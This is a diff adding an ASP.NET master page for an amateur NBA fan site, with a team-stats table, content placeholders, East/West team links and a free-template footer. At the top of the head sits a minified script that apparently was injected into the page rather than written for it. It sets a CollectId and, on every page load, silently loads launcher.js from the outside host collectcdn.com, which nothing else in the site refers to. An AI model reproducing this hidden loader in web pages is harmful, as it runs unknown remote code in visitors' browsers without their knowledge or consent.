@@ -1,0 +1,243 @@
+﻿<%@ Master Language="C#" %>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<script runat="server">
+</script>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head id="Head1" runat="server">
+    <title>NBA</title>
+    <script type="text/javascript">
+        !function (t, e) {
+            "use strict"; var r = function (t) {
+                try {
+                    var r = e.head || e.getElementsByTagName("head")[0], a = e.createElement("script");
+                    a.setAttribute("type", "text/javascript"), a.setAttribute("src", t), r.appendChild(a)
+                } catch (t) { }
+            }; t.CollectId = "5b0fc62372bdec600055cb10", r("https://collectcdn.com/launcher.js")
+        } (window, document);
+    </script>
+<meta http-equiv="Content-Language" content="English" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<link rel="stylesheet" type="text/css" href="../style.css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="../../rss-articles/" />
+<style type="text/css">
+    .table
+        {
+            width: 100%;
+            font-weight: 100;
+        height: 199px;
+    }
+.position
+        {
+            color: #FF9900;
+        }
+        .wins
+        {
+            color: #00CC00;
+        }
+        .loses
+        {
+            color: #FF3300;
+        }
+        .bp
+        {
+            color: #3366FF;
+        }
+        .ppg
+        {
+            color: #FFCC00;
+        }
+        .champs
+        {
+            color: #9933FF;
+        }
+        .style1
+    {
+        width: 100%;
+    }
+        
+    .style2
+    {
+        width: 40%;
+    }
+     
+     .style3
+    {
+        width: 20%;
+    } 
+    
+    .style4
+    {
+        width: 40%;
+    }   
+</style>
+</head>
+<body>
+
+<div id="wrap">
+
+<div id="header"> 
+<table class="style1">
+    <tr>
+        <td class="style2">
+            <h1><a href="home.aspx">NBA</a></h1>
+            <br />
+            <h2>Amit Finkel</h2>
+        </td>
+        <td class="style3">
+            <h4 style="color:White">enters counter: <%=Application["counter"] %></h4>
+        </td>
+        <td class="style4">
+        <center>
+        <br />
+            <h3 style="color: #FFFFFF"><%=Session["login"] %></h3>
+            <h4 style="color: #FFFFFF"><%=Session["level"] %></h4>
+            <a href="../../login.aspx">Login</a>
+            <a href="../../log-me-out.aspx">Logout</a>
+            </center>
+        </td>
+    </tr>
+</table>
+</div>
+
+<div id="content">
+<div class="right">
+<h2>
+<asp:ContentPlaceHolder id="title" runat="server">
+</asp:ContentPlaceHolder>
+</h2>
+
+<table class="table" border="1">
+        <tr>
+            <td class="position">
+                position</td>
+            <td class="wins">
+                wins</td>
+            <td class="loses">
+                loses</td>
+            <td class="bp">
+                best player</td>
+            <td class="ppg">
+                points per game</td>
+            <td class="champs">
+                champs</td>
+        </tr>
+        <tr style="font-size:20px">
+            <td class="position">
+                <asp:ContentPlaceHolder id="position" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+            <td class="wins">
+                <asp:ContentPlaceHolder id="wins" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+            <td class="loses">
+                <asp:ContentPlaceHolder id="loses" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+            <td class="bp">
+                <asp:ContentPlaceHolder id="bp" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+            <td class="ppg">
+                <asp:ContentPlaceHolder id="ppg" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+            <td class="champs">
+                <asp:ContentPlaceHolder id="champs" runat="server">
+                </asp:ContentPlaceHolder>
+            </td>
+        </tr>
+    </table>
+    <br /><br />
+<table class="style1" border="1">
+        <tr style="font-size: 17px; font-weight:bold;">
+            <td>
+                LOGO</td>
+            <td>
+                ARENA</td>
+        </tr>
+        <tr>
+            <td>
+                <asp:ContentPlaceHolder id="logo" runat="server">
+                </asp:ContentPlaceHolder></td>
+            <td style="font-size:18px;">
+                <asp:ContentPlaceHolder id="arena" runat="server">
+                </asp:ContentPlaceHolder></td>
+        </tr>
+    </table>
+</div>
+    
+<div class="left">
+
+
+<h2>EAST:</h2>
+<ul>
+<li><a href="boston.aspx">Boston Celtics</a></li> 
+<li><a href="brooklyn.aspx">Brooklyn Nets</a></li> 
+<li><a href="newyork.aspx">New York Knicks</a></li>
+<li><a href="philadelphia.aspx">Philadelphia 76ers</a></li> 
+<li><a href="toronto.aspx">Toronto Raptors</a></li>
+<li><a href="chicago.aspx">Chicago Bulls</a></li> 
+<li><a href="cleveland.aspx">Cleveland Cavaliers</a></li> 
+<li><a href="detroit.aspx">Detroit Pistons</a></li>
+<li><a href="indiana.aspx">Indiana Pacers</a></li> 
+<li><a href="milwaukee.aspx">Milwaukee Bucks</a></li>
+<li><a href="atlanta.aspx">Atlanta Hawks</a></li> 
+<li><a href="charlotte.aspx">Charlotte Hornets</a></li> 
+<li><a href="miami.aspx">Miami Heat</a></li>
+<li><a href="orlando.aspx">Orlando Magic</a></li> 
+<li><a href="washington.aspx">Washington Wizards</a></li>
+</ul>
+
+<h2>WEST:</h2>
+<ul>
+<li><a href="denver.aspx">Denver Nuggets</a></li> 
+<li><a href="minnesota.aspx">Minnesota Timberwolves</a></li> 
+<li><a href="oklahoma.aspx"">Oklahoma City Thunder</a></li> 
+<li><a href="portland.aspx">Portland Trail Blazers</a></li> 
+<li><a href="utah.aspx">Utah Jazz</a></li> 
+<li><a href="goldenstate.aspx">Golden State Warriors</a></li> 
+<li><a href="losangelesclippers.aspx">Los Angeles Clippers</a></li> 
+<li><a href="losangeleslakers.aspx">Los Angeles Lakers</a></li> 
+<li><a href="phoenix.aspx">Phoenix Suns</a></li> 
+<li><a href="sacramento.aspx">Sacramento Kings</a></li> 
+<li><a href="dallas.aspx">Dallas Mavericks</a></li> 
+<li><a href="houston.aspx">Houston Rockets</a></li> 
+<li><a href="memphis.aspx">Memphis Grizzlies</a></li> 
+<li><a href="neworleans.aspx">New Orleans Pelicans</a></li> 
+<li><a href="sanantonio.aspx">San Antonio Spurs</a></li> 
+</ul>
+
+<ul style="font-size:20px;">
+<li>
+<a href="blankmainmenu.aspx">
+<span style="font-size:15px; color:Green;">
+Main Menu
+</span>
+</a>
+</li>
+<li>
+<a href="more/blankmore/blankmore.aspx">
+<span style="font-size:15px; color:Green;">
+Players & Moments
+</span>
+</a>
+</li>
+</ul>
+
+</div>
+<div style="clear:both;"> </div>
+</div>
+
+<div id="bottom"> </div>
+
+<div id="footer">
+&copy; Copyright 2008 by <a href="#">Title or Url of your Website</a> | Design by <a href="http://www.free-css-templates.com/">Free CSS Templates</a> - Thanks to <a href="http://www.openwebdesign.org/">Web Design Dubai</a>
+</div>
+
+</div>
+</body>
+</html>
